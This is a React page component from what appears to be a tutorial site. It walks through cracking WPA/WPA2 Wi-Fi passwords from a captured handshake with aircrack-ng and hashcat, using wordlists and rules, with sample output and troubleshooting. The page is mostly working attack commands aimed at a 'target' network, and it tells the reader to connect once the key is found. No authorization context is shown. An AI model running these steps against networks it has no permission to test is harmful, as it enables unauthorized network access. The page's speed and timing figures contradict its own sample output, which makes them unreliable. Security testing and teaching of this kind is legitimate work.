import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import { Troubleshooting, TroubleItem } from '../../components/Troubleshooting';

export default function WPACracking() {
  return (
    <div className="content-area">
      <div className="topic-header">
        <div className="topic-breadcrumb">WPA / WPA2 Cracking <span>/</span> Cracking</div>
        <h1>Cracking WPA & WPA2 Using a Wordlist Attack</h1>
        <p className="topic-desc">With the handshake captured and a wordlist ready, use aircrack-ng to test each password against the captured handshake.</p>
      </div>

      <div className="topic-section">
        <h2>Cracking with aircrack-ng</h2>
        <Terminal title="WPA2 Cracking" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aircrack-ng ' }, { type: 'flag', text: '-w ' }, { type: 'path', text: '/usr/share/wordlists/rockyou.txt ' }, { type: 'flag', text: '-b ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'string', text: 'wpa_handshake-01.cap' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '                          Aircrack-ng 1.7' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '  [00:01:52] 35684/14344392 keys tested (320.15 k/s)' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '  Time left: 12 hours, 23 minutes, 45 seconds' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '                    ' }, { type: 'highlight', text: 'KEY FOUND! [ password123 ]' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '  Master Key     : A1 B2 C3 D4 E5 F6 ...' }],
          [{ type: 'output', text: '  Transient Key  : 1A 2B 3C 4D 5E 6F ...' }],
          [{ type: 'output', text: '' }],
        ]} />

        <InfoBox type="tip" title="Password Found!">
          <p>The password is shown after <code className="inline-code">KEY FOUND!</code>. In this example, the WiFi password is <code className="inline-code">password123</code>. You can now connect to the network using this password.</p>
        </InfoBox>
      </div>

      <div className="topic-section">
        <h2>Command Breakdown</h2>
        <table className="info-table">
          <thead>
            <tr><th>Flag</th><th>Purpose</th></tr>
          </thead>
          <tbody>
            <tr><td><code>-w /path/to/wordlist</code></td><td>Path to the wordlist file</td></tr>
            <tr><td><code>-b AA:BB:CC:DD:EE:FF</code></td><td>BSSID of target network</td></tr>
            <tr><td><code>capture.cap</code></td><td>The capture file containing the handshake</td></tr>
            <tr><td><code>-l output.txt</code></td><td>Save the found key to a file</td></tr>
          </tbody>
        </table>
      </div>

      <div className="topic-section">
        <h2>Faster Cracking with Hashcat (GPU)</h2>
        <p>Hashcat uses your GPU for cracking, which is <strong>10-100x faster</strong> than aircrack-ng (CPU only).</p>

        <h3>Step 1: Convert .cap to .hc22000 format</h3>
        <Terminal title="Convert Capture File" lines={[
          [{ type: 'comment', text: '# Install hcxtools if not present' }],
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo apt install ' }, { type: 'string', text: 'hcxtools' }],
          [{ type: 'output', text: '' }],
          [{ type: 'comment', text: '# Convert .cap to hashcat format' }],
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'hcxpcapngtool ' }, { type: 'flag', text: '-o ' }, { type: 'path', text: 'hash.hc22000 ' }, { type: 'string', text: 'wpa_handshake-01.cap' }],
        ]} />

        <h3>Step 2: Run Hashcat</h3>
        <Terminal title="Hashcat GPU Cracking" lines={[
          [{ type: 'comment', text: '# Dictionary attack with GPU' }],
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'hashcat ' }, { type: 'flag', text: '-m 22000 ' }, { type: 'path', text: 'hash.hc22000 ' }, { type: 'path', text: '/usr/share/wordlists/rockyou.txt' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: 'Session...........: hashcat' }],
          [{ type: 'output', text: 'Status...........: Running' }],
          [{ type: 'output', text: 'Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)' }],
          [{ type: 'output', text: 'Speed.#1.........:   125.3 kH/s' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: 'hash.hc22000:' }, { type: 'highlight', text: 'password123' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: 'Status...........: Cracked' }],
        ]} />

        <h3>Hashcat with Rules (Smarter Attacks)</h3>
        <Terminal title="Hashcat with Rules" lines={[
          [{ type: 'comment', text: '# Use best64 rule to add variations (numbers, caps, etc.)' }],
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'hashcat ' }, { type: 'flag', text: '-m 22000 ' }, { type: 'path', text: 'hash.hc22000 ' }, { type: 'path', text: '/usr/share/wordlists/rockyou.txt ' }, { type: 'flag', text: '-r ' }, { type: 'path', text: '/usr/share/hashcat/rules/best64.rule' }],
          [{ type: 'comment', text: '# This tests each word + variations: Password, password1, PASSWORD, p@ssword, etc.' }],
        ]} />
      </div>

      <div className="topic-section">
        <h2>Speed Comparison</h2>
        <table className="info-table">
          <thead>
            <tr><th>Tool</th><th>Hardware</th><th>Speed (keys/sec)</th></tr>
          </thead>
          <tbody>
            <tr><td><strong>aircrack-ng</strong></td><td>CPU (i7)</td><td>~3,000-5,000</td></tr>
            <tr><td><strong>hashcat</strong></td><td>GPU (RTX 3070)</td><td>~300,000-500,000</td></tr>
            <tr><td><strong>hashcat</strong></td><td>GPU (RTX 4090)</td><td>~1,000,000+</td></tr>
          </tbody>
        </table>

        <InfoBox type="note">
          <p>With aircrack-ng, rockyou.txt (~14M passwords) takes about 45 minutes. With hashcat on a decent GPU, it takes under a minute.</p>
        </InfoBox>
      </div>

      <Troubleshooting>
        <TroubleItem issue="KEY NOT FOUND — exhausted wordlist">
          <div className="solution">Solution:</div>
          <p>The password is not in your wordlist. Options:</p>
          <ul style={{ paddingLeft: 20, marginTop: 8 }}>
            <li>Try a bigger wordlist (download from SecLists or internet)</li>
            <li>Create a targeted wordlist with crunch based on what you know about the target</li>
            <li>Use hashcat with rules to generate variations</li>
            <li>Accept that strong random passwords can't be cracked this way</li>
          </ul>
        </TroubleItem>
        <TroubleItem issue="'Passphrase must have between 8 and 63 characters'">
          <p>WPA passwords must be 8-63 characters. aircrack-ng is warning that some entries in your wordlist are shorter than 8 chars and will be skipped. This is normal — the tool just skips them.</p>
        </TroubleItem>
        <TroubleItem issue="Hashcat says 'No hashes loaded'">
          <div className="solution">Solution:</div>
          <p>The conversion failed or the hash file is empty. Re-run <code className="inline-code">hcxpcapngtool</code> and make sure it shows that it found handshakes. If not, your .cap file doesn't contain a valid handshake.</p>
        </TroubleItem>
        <TroubleItem issue="Hashcat 'CUDA/OpenCL not found'">
          <div className="solution">Solution:</div>
          <p>GPU drivers not installed. In a VM, GPU passthrough is complicated. For VM users, stick with aircrack-ng. For native Linux, install NVIDIA drivers:</p>
          <Terminal title="Install NVIDIA" lines={[
            [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo apt install ' }, { type: 'string', text: 'nvidia-driver nvidia-cuda-toolkit' }],
          ]} />
        </TroubleItem>
        <TroubleItem issue="Cracking is extremely slow">
          <div className="solution">Solution:</div>
          <p>WPA cracking is intentionally slow because PBKDF2 hashing is CPU-intensive. To speed up:</p>
          <ul style={{ paddingLeft: 20, marginTop: 8 }}>
            <li>Use hashcat with a GPU instead of aircrack-ng</li>
            <li>Use a smaller, more targeted wordlist</li>
            <li>Use rules instead of a massive wordlist</li>
          </ul>
        </TroubleItem>
      </Troubleshooting>
    </div>
  );
}
